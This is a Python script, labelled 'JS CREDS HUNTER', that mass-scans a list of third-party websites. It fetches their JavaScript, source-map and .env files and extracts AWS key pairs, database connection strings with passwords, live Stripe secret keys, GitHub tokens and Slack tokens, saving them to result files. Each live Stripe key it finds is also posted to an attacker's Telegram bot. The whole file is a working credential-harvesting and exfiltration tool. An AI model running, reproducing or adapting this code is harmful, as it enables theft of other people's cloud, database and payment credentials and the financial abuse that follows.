import os
import re
import requests
import warnings
import math
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from threading import Lock
from datetime import datetime
import sys

# Suppress warnings
requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Initialize colorama
init(autoreset=True)

lock = Lock()
processed_hits = set() 

# Results Folder
TIMESTAMP = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
RESULTS_DIR = f"JS_Results_{TIMESTAMP}"
os.makedirs(RESULTS_DIR, exist_ok=True)

# Separate Output Files
FILE_AWS         = os.path.join(RESULTS_DIR, "RESULT-AWS.txt")
FILE_STRIPE      = os.path.join(RESULTS_DIR, "RESULT-STRIPE.txt")
FILE_DB          = os.path.join(RESULTS_DIR, "RESULT-DB.txt")
FILE_TOKENS      = os.path.join(RESULTS_DIR, "RESULT-TOKENS.txt") 
FINGERPRINT_FILE = os.path.join(RESULTS_DIR, "fingerprinted.txt")

TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN' # Edit this
TELEGRAM_CHAT  = 'YOUR_TELEGRAM_CHAT_ID' # And Edit this

# Logic Gate V4 - Library Noise
LIBRARY_NOISE = [
    "wordwrap", "getPrivateBaseKey", "TypeError", "JSEncrypt", "RSAKey", 
    "PKCS#8", "pkcs8", "this.", "prototype", "ASN1", "forge"
]

class Colors:
    CYAN        = '\033[96m'
    BRIGHT_CYAN = '\033[1;96m'
    BOLD        = '\033[1m'
    RESET       = '\033[0m'

def get_entropy(s):
    if not s: return 0
    prob = [float(s.count(c)) / len(s) for c in dict.fromkeys(list(s))]
    return - sum([p * math.log(p) / math.log(2.0) for p in prob])

def is_noise(context):
    return any(word in context for word in LIBRARY_NOISE)

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = r'''
     ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
     ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
     ██║███████╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██   ██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
╚█████╔╝███████║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚════╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    '''
    print(Fore.CYAN + Style.BRIGHT + banner)
    print(Fore.CYAN + "    [+] JS CREDS HUNTER • Bob Marley")
    print(Fore.CYAN + "    [+] VENI | VIDI | VICI\n")

def send_telegram_stripe(url, key):
    msg = (
        "<b>Stripe Secret Found</b>\n"
        "<pre>\n"
        "copy\n\n"
        f"URL: {url}\n"
        "STRIPE_SECRET:\n"
        f"{key}\n"
        "</pre>"
    )
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={'chat_id': TELEGRAM_CHAT, 'text': msg, 'parse_mode': 'HTML'},
            timeout=10, 
            verify=False
        )
    except: pass

def log_fingerprint(url):
    with lock:
        with open(FINGERPRINT_FILE, 'a') as f:
            f.write(url + '\n')

def extract_secrets(content, url):
    # 1. AWS (Logic Gate V4 + Region Grab)
    akia_matches = re.finditer(r'(?:AKIA|ASIA)[A-Z0-9]{16}', content)
    for match in akia_matches:
        acc = match.group()
        start, end = match.span()
        # Large lookaround for region
        search_area = content[max(0, start-750):min(len(content), end+750)]
        sec_m = re.search(r'[a-zA-Z0-9+/]{40}', search_area.replace(acc, ''))
        if sec_m:
            sec = sec_m.group(0)
            if "AAAAA" not in sec and get_entropy(sec) > 3.8 and not is_noise(search_area):
                # Region Grab
                reg_m = re.search(r'region["\']?\s*[:=]\s*["\']([a-z0-9-]+)["\']', search_area)
                region = reg_m.group(1) if reg_m else "Unknown"
                
                hit_id = f"AWS:{sec}"
                with lock:
                    if hit_id not in processed_hits:
                        processed_hits.add(hit_id)
                        with open(FILE_AWS, 'a') as f: 
                            f.write(f"URL: {url}\nREGION: {region}\nKEY: {acc} | {sec}\n{'-'*50}\n")
                        print(f"      {Fore.GREEN}AWS EXPOSURE FOUND ({region}){Style.RESET_ALL}")

    # 2. Database Connection Strings (Validated V5)
    # Protocols: mongo, postgres, mysql, redis, mssql, etc.
    # Logic: Captures protocol://user:pass@host[:port]/path
    db_pattern = r'(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|mssql|sqlsrv)://[^/\s"\'<>]+:[^/\s"\'<>@]+@[^/\s"\'<>@]+(?::\d+)?(?:/[^?\s"\'<>#]*)?(?:\?[^"\'\s<>#]*)?'
    db_matches = re.finditer(db_pattern, content, re.IGNORECASE)
    for m in db_matches:
        db_str = m.group()
        if not any(x in db_str.lower() for x in ["localhost", "127.0.0.1", "gitlab-ci-token"]):
            with lock:
                if db_str not in processed_hits:
                    processed_hits.add(db_str)
                    with open(FILE_DB, 'a') as f: f.write(f"URL: {url} | DB: {db_str}\n")
                    print(f"      {Fore.GREEN}DB AUTH URL FOUND{Style.RESET_ALL}")

    # 3. Stripe & Tokens
    tokens = {
        "STRIPE_LIVE": r'sk_live_[0-9a-zA-Z]{24,}',
        "GITHUB_PAT": r'ghp_[0-9a-zA-Z]{36}',
        "SLACK_TOKEN": r'xox[baprs]-[0-9a-zA-Z\-]+'
    }
    for label, pat in tokens.items():
        matches = re.findall(pat, content)
        for m in matches:
            with lock:
                if m not in processed_hits:
                    processed_hits.add(m)
                    f_out = FILE_STRIPE if "STRIPE" in label else FILE_TOKENS
                    with open(f_out, 'a') as f: f.write(f"URL: {url} | {label}: {m}\n")
                    if label == "STRIPE_LIVE": send_telegram_stripe(url, m)
                    print(f"      {Fore.YELLOW}{label} FOUND{Style.RESET_ALL}")

def find_js_files(base_url):
    js_files = set()
    try:
        r = requests.get(base_url, timeout=7, verify=False, allow_redirects=True)
        if r.status_code == 200:
            log_fingerprint(base_url)
            soup = BeautifulSoup(r.text, 'html.parser')
            for tag in soup.find_all(['script', 'a']):
                src = tag.get('src') or tag.get('href')
                if src:
                    u = urljoin(base_url, src)
                    if any(u.lower().endswith(e) for e in ['.js', '.ts', '.mjs']):
                        js_files.add(u)
                        js_files.add(u + ".map")
            extras = re.findall(r'["\']([^"\']+\.(?:js|ts|mjs|json|env))["\']', r.text)
            for e in extras[:25]: 
                u = urljoin(base_url, e)
                js_files.add(u)
                if u.endswith('.js'): js_files.add(u + ".map")
    except: pass
    return list(js_files)[:40]

def process_target(target):
    if not target.startswith(('http',)):
        target = 'https://' + target
    target = target.rstrip('/')
    
    print(f"{Colors.CYAN}→ {target}{Colors.RESET}")
    
    if any(target.lower().endswith(e) for e in ['.js', '.ts', '.env']):
        log_fingerprint(target)
        js_list = [target]
    else:
        js_list = find_js_files(target)
    
    if not js_list: return

    for js in js_list:
        try:
            r = requests.get(js, timeout=8, verify=False)
            if r.status_code == 200 and (len(r.text) > 20 or js.endswith('.env')):
                name = js.rsplit('/', 1)[-1][:50] or 'inline.js'
                print(f"  {Fore.GREEN}└─ {name}{Style.RESET_ALL}")
                extract_secrets(r.text, js)
        except: pass

def main():
    print_banner()
    t_file = input(f"{Colors.CYAN}Targets file (.txt) → {Colors.RESET}").strip()
    if not os.path.exists(t_file):
        print(f"{Fore.RED}File not found.{Style.RESET_ALL}")
        return
    
    threads_raw = input(f"{Colors.CYAN}Threads (default 100) → {Colors.RESET}").strip()
    max_threads = int(threads_raw) if threads_raw.isdigit() else 100
    
    with open(t_file, 'r', encoding='utf-8', errors='ignore') as f:
        targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    
    if not targets:
        print(f"{Fore.YELLOW}No targets found.{Style.RESET_ALL}")
        return
        
    print(f"\n{Colors.CYAN}[*] {len(targets)} targets | {max_threads} threads | {RESULTS_DIR}{Style.RESET_ALL}\n")
    
    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        pool.map(process_target, targets)
    
    print(f"\n{Fore.GREEN}[!] Elite Scan Finished. Results in {RESULTS_DIR}{Style.RESET_ALL}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
